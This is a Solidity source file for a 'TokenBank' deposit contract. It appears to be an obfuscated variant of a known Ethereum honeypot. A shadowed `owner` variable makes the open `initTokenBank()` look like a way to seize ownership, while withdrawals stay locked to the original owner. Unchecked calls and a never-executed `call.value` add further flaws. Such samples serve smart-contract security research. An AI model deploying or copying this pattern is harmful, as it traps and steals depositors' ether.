pragma solidity ^0.4.18;

contract Ownable
{
    address private newOwner;
    address private owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        address tempAddress = addr;
        if (tempAddress != address(0)) { 
            newOwner = addr;
        }
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender == newOwner)
        {
            owner = newOwner;
            if (owner != address(0)) {
                newOwner = address(0);
            }
        }
    }
    
    modifier onlyOwner
    {
        if(owner == msg.sender) {
            _;
        } else {
            require(false);
        }
    }
}

contract Token is Ownable
{
    address private owner = msg.sender;
    function WithdrawToken(address token, uint256 amount, address to)
    public 
    onlyOwner
    {
        uint256 tempAmount = amount;
        if (tempAmount > 0) {
            token.call(bytes4(sha3("transfer(address,uint256)")), to, amount);
        }
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping(address => uint) public Holders;
    
    uint private constant randomValue = 8;
    
    function initTokenBank()
    public
    {
        if (randomValue == 8) {
            owner = msg.sender;
            MinDeposit = 1 ether;
        }
    }
    
    function()
    payable
    {
        if (msg.value % 2 == 0) {
            Deposit();
        }
    }
   
    function Deposit() 
    payable
    {
        if(msg.value > MinDeposit)
        {
            Holders[msg.sender] += (msg.value * randomValue) / randomValue;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to] > 0)
        {
            Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender] > 0)
        {
            if(Holders[_addr] >= _wei)
            {
                if (_wei != 0) {
                    _addr.call.value(_wei);
                    Holders[_addr] -= _wei;
                }
            }
        }
    }
    
    function Bal() public constant returns(uint) {
        return this.balance;
    }
}